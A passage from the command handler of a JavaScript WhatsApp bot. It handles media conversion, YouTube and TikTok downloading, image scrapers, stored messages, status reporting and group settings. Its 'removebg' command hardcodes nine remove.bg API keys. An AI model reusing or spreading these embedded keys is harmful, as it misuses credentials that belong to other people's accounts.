                    conn.sendMessage(m.chat, { image: bufferimg13x }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
case prefix+'tomp4': case prefix+'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `reply sticker with caption *${command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case prefix+'toaud': case prefix+'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Use as Audio With Caption ${command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case prefix+'tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${command}`
            if (!quoted) throw `Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
            }
            break
            case prefix+'tovn': case prefix+'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio That You Want To Be VN With Caption ${command}`
            if (!quoted) throw `Reply Video/Audio That You Want To Be VN With Caption ${command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case prefix+'togif': {
                if (!quoted) throw 'Reply video'
                if (!/webp/.test(mime)) throw `reply sticker with caption *${command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case prefix+'imagenobg': case prefix+'removebg': case prefix+'remove-bg': {
	    if (!quoted) throw `Send/Reply Image With Caption ${command}`
	    if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${command}`
	    if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await conn.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    conn.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
        case prefix+'id':{
                    m.reply(from)
                   }
                  break
        case prefix+'toqr':{
          if (!q) return m.reply(' Please include link or text!')
           let qyuer = await qrcode.toDataURL(q, { scale: 35 })
           let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
           let buff = getRandom('.jpg')
           await fs.writeFileSync('./'+buff, data)
           let medi = fs.readFileSync('./' + buff)
          await conn.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
           setTimeout(() => { fs.unlinkSync(buff) }, 10000)
          }
          break
	    case prefix+'yts': case prefix+'ytsearch': {
                if (!text) throw `Example : ${command} story wa anime`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `• No : ${no++}\n• Type : ${i.type}\n• Video ID : ${i.videoId}\n• Title : ${i.title}\n• Views : ${i.views}\n• Duration : ${i.timestamp}\n• Uploaded : ${i.ago}\n• Url : ${i.url}\n\n─────────────────\n\n`
                }
                conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case prefix+'google': {
                if (!text) throw `Example : ${command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        
    case prefix+'play': case prefix+'ytplay':{
                if (!text) throw `Example : ${command} jedag jedug kawai`
                let yts = require("youtube-yts")
                let search = await yts(text)
                let anulay = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: prefix+`playmp3 ${anulay.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: prefix+`playmp4 ${anulay.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anulay.thumbnail },
                    caption: `
• Title : ${anulay.title}
• Ext : Search
• ID : ${anulay.videoId}
• Duration : ${anulay.timestamp}
• Viewers : ${anulay.views}
• Upload At : ${anulay.ago}
• Author : ${anulay.author.name}
• Channel : ${anulay.author.url}
• Description : ${anulay.description}
• Url : ${anulay.url}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                conn.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case prefix+'playmp3': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if (!text) throw `Example : ${command} anime whatsapp status`
const xeonplaymp3 = require('./lib/ytdl2')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
break
case prefix+'playmp4': //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
if(!text) throw `Example : ${command} anime kawai`
const xeonplaymp4 = require('./lib/ytdl2')
let ytsmp4 = require("youtube-yts")
        let xeonsearch13 = await ytsmp4(text)
        let anuvidoke4 = xeonsearch13.videos[0]
const pl2= await xeonplaymp4.mp4(anuvidoke4.url)
await conn.sendMessage(m.chat,{
    document: {url:pl2.videoUrl},
    fileName: anuvidoke4.title + '.mp4',
    mimetype: 'video/mp4',
    contextInfo:{
        externalAdReply:{
            title:anuvidoke4.title,
            body: botname,
            thumbnail: await fetchBuffer(anuvidoke4.thumbnail),
            mediaType:2,
            mediaUrl:anuvidoke4.url,
        }

    },
},{quoted:m})
break
case prefix+'ytmp3': case prefix+'mp3':{ //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonaudp3 = require('./lib/ytdl2')
if (args.length < 2 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) throw `please insert link youtube\n\nExample : ${command} https://youtu.be/0xz3Wd7H9YU`
const audio=await xeonaudp3.mp3(text)
await conn.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
}
break
	    case prefix+'ytmp3xx': case prefix+'ytaudioxx': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `please insert link youtube\n\nExample : ${command} https://youtu.be/0xz3Wd7H9YU`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                conn.sendImage(m.chat, media.thumb, `• Title : ${media.title}\n• File Size : ${media.filesizeF}\n• Url : ${isUrl(text)}\n• Ext : MP3\n• Resolution : ${args[1] || '128kbps'}`, m)
                conn.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
case prefix+'ytmp42': case prefix+'mp42': {  //credit: Ray Senpai ❤️ https://github.com/EternityBots/Nezuko
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 2 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) throw `please insert link youtube\n\nExample : ${command} https://youtu.be/0xz3Wd7H9YU`
const vid=await xeonvidoh.mp4(text)
const ytc=`
*•Tittle:* ${vid.title}
*•Date:* ${vid.date}
*•Duration:* ${vid.duration}
*•Quality:* ${vid.quality}`
await conn.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case prefix+'ytt4':{

    try {
        await ytMp4v2(q).then(async(res) =>{
            
    //console.log(result)
    //if (result.length < 1) return reply('anime not found')
    let result = res.result_array
    let list = []
    for (let x of result) {
    list.push({
    title: `${x.quality}\n`,
    rowId: `${prefix}sendytvid ${x.video} ` + args[1],
    description: `${x.size}`
    })
    }
    const listMessage = {
      text: parseRes(res.result),
      footer: botname,
      buttonText: "OTHER RESOLUTION",
      sections: [{
    title: "CHOOSE RESOLUTION",
      rows: list
    }],
    listType: 1
    }
    const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
        })
} catch (err) {
  console.log(err)
  reply(toJSON(err))
  }
}
break
case prefix+'sendytvid':{
    console.log(q)
try{
        await ytMp4(args[2]).then(async(result) =>{
        await conn.sendMessage(m.chat,{
        document: {url:args[1]},
        fileName: result.title + '.mp4',
        mimetype: 'video/mp4',
        contextInfo:{
            externalAdReply:{
                title:result.title,
                body: botname,
                thumbnail: await fetchBuffer(result.thumb),
                mediaType:2,
                mediaUrl:args[2],
            }
        },
    },{quoted:m})
})
  
} catch (err) {
    console.log(err)
    reply(toJSON(err))
    }
}
break
case prefix+'ytmp4':  case prefix+'mp4':{
  if (!q) return reply('please insert link youtube')
  let Linksy = args[1].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
  if (!Linksy) return reply('link tidak valid')
  try {
await ytMp4(q).then(async(res) =>{
  //console.log(res)
  if (Number(res.sizeF) >= 50000000) {
    conn.sendImage(from, res.thumb, `SIZE TOO BIG\n\n*Title* = ${res.title}\n*Quality* = ${res.quality}\n*size* = ${res.size}\n*Url download* = ${res.result}`, m)
  } else {
 var teks1 = `*Title* = ${res.title}\n*Filetype* = video/mp4\n*Quality* = ${res.quality}\n*size* = ${res.size}\n*Channel* = ${res.channel}\n*Publish Date* = ${res.uploadDate}\n*Likes* = ${res.likes}\n*Dislikes* = ${res.dislike}\n*View Count* = ${res.views}\n*Description* = ${res.desc}\n*Url* = ${args[0]}`;
  conn.sendMessage(from, {video: {url:res.result}, caption:teks1}, {quoted:m})
  //reply(teks1)
  }
})
} catch (err) {
  console.log(err)
  reply(toJSON(err))
  }
}
break
            case prefix+'ytmp4xx': case prefix+'ytvideoxx': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Over Limit '+util.format(media))
                conn.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `• Title : ${media.title}\n• File Size : ${media.filesizeF}\n• Url : ${isUrl(text)}\n• Ext : MP3\n• Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
case prefix+'pinterest': {
        let { pinterest } = require('./lib/scraper')
                anupint = await pinterest(text)
                result = anupint[Math.floor(Math.random() * anupint.length)]
                conn.sendMessage(m.chat, { image: { url: result }, caption: `Result for: ${text}\nMedia Url: `+result }, { quoted: m })
            }
            break
            case prefix+'waifu': {
            	anufux = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
                buffer13x = await getBuffer(anufux.url)
                let buttons = [{buttonId: `waifu`, buttonText: {displayText: 'Next Image'}, type: 1},{buttonId: `animemenu`, buttonText: {displayText: '⬅️Back'}, type: 1}]
                let buttonMessage = {
                    image: buffer13x,
                    caption: `Random Waifu`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                conn.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case prefix+'couplepp': case prefix+'ppcouple': {
                m.reply(mess.wait)
                let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
                let random = anucpp[Math.floor(Math.random() * anucpp.length)]
                conn.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                conn.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case prefix+'wallpaper': {
                if (!text) throw 'Enter Query Title'
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `• Title : ${result.title}\n• Category : ${result.type}\n• Detail : ${result.source}\n• Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                conn.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case prefix+'wikimedia': {
                if (!text) throw 'Enter Query Title'
		let { wikimedia } = require('./lib/scraper')
                anuwmedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `• Title : ${result.title}\n• Source : ${result.source}\n• Media Url : ${result.image}`,
                    footer: botname,
                    buttons: buttons,
                    headerType: 4
                }
                conn.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
 case prefix+'tinyurl':{
   if(!q) return m.reply('link?')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  m.reply(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case prefix+'tiktok':  case prefix+'tt':{ 
if (!text) return m.reply( `Example : ${command} link`)
if (!isUrl(args[1]) && !q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
try {
require('./lib/tiktok').Tiktok(q).then( data => {
    //console.log(data)
    var button = [{ buttonId: prefix+`tiktokaudio ${q}`, buttonText: { displayText: `GET AUDIO` }, type: 1 }]
conn.sendMessage(m.chat, { caption: `${data.title}`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] }).catch ((err) => reply('Gagal saat mengirim File'))
})
} catch (err) {
    m.reply(`something error`)
    }
}
break
case prefix+'tiktokaudio':{
if (!text) return m.reply( `Example : ${command} link`)
if (!isUrl(args[1]) && !q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
try {
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m }).catch ((err) => reply('Gagal saat mengirim File'))
})
} catch (err) {
    m.reply(`something error`)
    }
}
break

case prefix+'jadibot': {
    if (!isCreator) return
//if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
jadibot(conn, m, m.chat)
}
break
case prefix+'rentbotlist':
try {
let user = [... new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)])]
te = "*Bot Rent List*\n\n"
for (let i of user){
let y = await conn.decodeJid(i.id)
te += " × User : @" + y.split("@")[0] + "\n"
te += " × Name : " + i.name + "\n\n"
}
conn.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`There are no users who have rented bot yet`)
}
break
case prefix+'git': case prefix+'gitclone':
if (!args[1]) return m.reply(`Mana link nya?\nContoh :\n${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[1]) && !args[1].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[1].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
case prefix+'pin':  case prefix+'pinterest': {
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
conn.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m }).catch((err) => reply(mess.error))
}
break
        case prefix+'ringtone': {
		if (!text) throw `Example : ${command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		conn.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case prefix+'bass': case prefix+'blown': case prefix+'deep': case prefix+'earrape': case prefix+'fast': case prefix+'fat': case prefix+'nightcore': case prefix+'reverse': case prefix+'robot': case prefix+'slow': case prefix+'smooth': case prefix+'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Reply to the audio you want to change with a caption *${command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case prefix+'setcmd': {
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `For What Command?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case prefix+'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `No hashes`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case prefix+'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                conn.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case prefix+'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Message!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case prefix+'addmsg': {
                if (!m.quoted) throw 'Reply Message You Want To Save In Database'
                if (!text) throw `Example : ${command} filename`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' registered in the message list`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case prefix+'getmsg': {
                if (!text) throw `Example : ${command} file name\n\nView message list with ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' not listed in the message list`
                conn.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case prefix+'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `• *Name :* ${i.nama}\n• *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case prefix+'delmsg': case prefix+'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		m.reply(`Successfully deleted '${text}' from the message list`)
            }
	    break
case prefix+'owner': case prefix+'creator': case prefix+'moderator': case prefix+'mod': {
conn.sendContact(m.chat, owner, m)
}
            break
            case prefix+'public': {
                if (!isCreator) throw mess.owner
                conn.mode = 'public'
                m.reply('*Successful in Changing To Public Usage*')
            }
            break
            case prefix+'self': {
                if (!isCreator) throw mess.owner
                conn.mode = 'self'
                m.reply('*Successful in Changing To Self Usage*')
            }
            break
            case prefix+'ping': case prefix+'botstatus': case prefix+'statusbot': case prefix+'p': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case prefix+'runtime':{
                m.reply(`Runtime : ${runtime(process.uptime())}`)
            }
            break
case prefix+'setthumb':{
                       if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
                       if (!isQuotedImage) return m.reply('Reply the picture!')
                                 let media = await conn.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
                await fs.writeFileSync('./XeonMedia/theme/cheemspic.jpg', media)
               m.reply(mess.success)
            }
          break
          case prefix+'fliptext': {
          if (args.length < 2) return m.reply(`Example:\n${prefix}fliptext ${ownername}`)
          quere = args[1]
          flipe = quere.split('').reverse().join('')
          m.reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
          }
          break
          case prefix+'toviewonce': case prefix+'toonce': { 
                  if (!quoted) return m.reply(`Reply image`)
                  if (/image/.test(mime)) {
          anuoncr2 = await conn.downloadAndSaveMediaMessage(quoted)
          conn.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
                  } else if (/video/.test(mime)) {
                  anuonce2 = await conn.downloadAndSaveMediaMessage(quoted)
                  conn.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
                  }
                  }
                  break
case prefix+'creategroup':
if (!isCreator) return m.reply(mess.owner)
if (!q) return reply("Enter text")
const group = await conn.groupCreate(q, [owner + "@s.whatsapp.net"])
m.reply(mess.success)
conn.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break

            //nhentai
case prefix+'nhentai':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    if (!q) return reply(`Input code nuclear to get doujin file PDF.\n\n~Usage:\n${command} <code>\n~example\n${command} 177013`)
    let code = q
    console.log(`Searching Nhentai Metadata for code ${code}...`)
  await nhPDF(conn, from, code, m).catch((err) => m.reply(mess.error))
  }
  break
  case prefix+'nhrandom':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    //if (!q) return reply(`Input code nuclear to get doujin file PDF.\n\n~Usage:\n${command} <code>\n~example\n${command} 177013`)
    let nh = await axios.get('https://janda.mod.land/nhentai/random')
    let result = nh.data.data
    let code = result.id
    console.log(`Searching Nhentai Metadata for code ${code}...`)
  await nhPDF(conn, from, code, m).catch((err) => m.reply(mess.error))
  }
  break
  case prefix+'nhsearch':{
    if (!m.isGroup) throw mess.group
    if (!isNsfw) return m.reply(mess.nsfw)
    if (!q) return reply(`Input query!`)
    try {
    let nh = await axios.get(`https://janda.mod.land/nhentai/search?key=${q}`)
    let result = nh.data.data
  let list = []
  for (let x of result) {
  list.push({
  title: `${x.id} - ${x.title.english}\n`,
  rowId: `${prefix}nhentai ${x.id}`,
  description: `*Pages* : ${x.total}\n*Languages* : ${x.language}\n*Tags* : ${x.tags.join(', ')}`
  })
  }
  const listMessage = {
    text: `*NHENTAI SEARCH*\n\n${q}`,
    footer: botname,
    buttonText: "Click Here!",
    sections: [{
  title: "NHENTAI SEARCH",
    rows: list
  }],
  listType: 1
  }
  const sendMsg = await conn.sendMessage(from, listMessage, {quoted:m})
  } catch (err) {
    m.reply(mess.error)
  }
  }
  break

  // setting group
case prefix+'antitoxic': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[1] === "on") {
if (antiToxic) return m.reply('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
m.reply('Success in turning on antitoxic in this group')
var groupe = await conn.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
conn.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[1] === "off") {
if (!antiToxic) return m.reply('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
